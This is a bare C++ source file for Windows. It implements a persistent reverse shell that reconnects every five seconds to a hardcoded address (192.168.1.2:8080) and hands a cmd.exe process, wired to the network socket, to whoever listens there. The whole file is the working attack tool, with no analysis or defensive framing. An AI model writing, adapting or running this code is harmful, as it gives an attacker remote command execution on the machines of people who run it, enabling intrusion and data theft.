#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
constexpr auto default_buffer_length = 1024;

void shell(wchar_t* ip, int port)
{
    while (true) {
        Sleep(5000);

        WSADATA version;
        if (WSAStartup(MAKEWORD(2, 2), &version) != 0)
        {
            continue;
        }

        SOCKET my_socket;
        if ((my_socket = WSASocketW(
            AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, static_cast<unsigned>(NULL), static_cast<unsigned>(NULL))) == INVALID_SOCKET)
        {
            WSACleanup();
            continue;
        }

        sockaddr_in address{};
        address.sin_family = AF_INET;
        InetPton(AF_INET, ip, &address.sin_addr.s_addr);
        address.sin_port = htons(port);

        if (WSAConnect(my_socket, reinterpret_cast<SOCKADDR*>(&address), sizeof(address), nullptr, nullptr, nullptr, nullptr) == SOCKET_ERROR) {
            closesocket(my_socket);
            WSACleanup();
            continue;
        }

        char receive_data[default_buffer_length];
        memset(receive_data, 0, sizeof(receive_data));
        auto receive_code = recv(my_socket, receive_data, default_buffer_length, 0);
        if (receive_code <= 0) {
            closesocket(my_socket);
            WSACleanup();
            continue;
        }

        wchar_t command_line[8] = L"cmd.exe";
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = reinterpret_cast<HANDLE>(my_socket);

        CreateProcess(nullptr, command_line, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        memset(receive_data, 0, sizeof(receive_data));
        receive_code = recv(my_socket, receive_data, default_buffer_length, 0);
        if (receive_code <= 0) {
            closesocket(my_socket);
            WSACleanup();
            continue;
        }

        if (strcmp(receive_data, "exit\n") == 0) {
            break;
        }
    }
}

int main()
{
    wchar_t ip[12] = L"192.168.1.2";
    int port = 8080;
    shell(ip, port);
}
